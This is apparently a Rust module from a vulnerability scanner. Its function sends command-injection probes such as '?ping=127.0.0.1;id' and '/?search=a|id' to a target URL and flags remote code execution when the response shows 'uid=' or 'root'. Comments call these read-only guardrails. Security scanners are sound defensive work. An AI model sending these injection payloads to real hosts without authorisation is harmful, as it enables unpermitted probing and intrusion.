use reqwest::Client;
use std::time::Duration;

pub async fn verify_rce(target_url: &str) -> Result<Option<String>, String> {
    let base_url = if !target_url.starts_with("http") {
        format!("http://{}", target_url)
    } else {
        target_url.to_string()
    };

    let client = Client::builder()
        .timeout(Duration::from_secs(5)) // Guardrail: таймаут
        .danger_accept_invalid_certs(true)
        .build()
        .map_err(|e| e.to_string())?;

    // Guardrail: ИСПОЛЬЗОВАТЬ ТОЛЬКО READ-ONLY КОМАНДЫ! Никаких пайпов и редиректов.
    let safe_payloads = vec![
        "?cmd=id",
        "?exec=whoami",
        "?ping=127.0.0.1;id", // Классическая инъекция в пинг
        "/?search=a|id",
    ];

    let mut found_rce = Vec::new();

    for payload in safe_payloads {
        let url = format!(
            "{}/{}",
            base_url.trim_end_matches('/'),
            payload.trim_start_matches('/')
        );

        // Guardrail: Этическая задержка
        tokio::time::sleep(Duration::from_millis(500)).await;

        if let Ok(response) = client.get(&url).send().await {
            if let Ok(text) = response.text().await {
                // Ищем стандартный вывод команды 'id' (Linux) или 'whoami'
                if (text.contains("uid=") && text.contains("gid="))
                    || text.contains("www-data")
                    || text.contains("root")
                {
                    found_rce.push(format!("Payload '{}' triggers RCE", payload));
                }
            }
        }
    }

    if found_rce.is_empty() {
        Ok(None)
    } else {
        Ok(Some(found_rce.join(" | ")))
    }
}
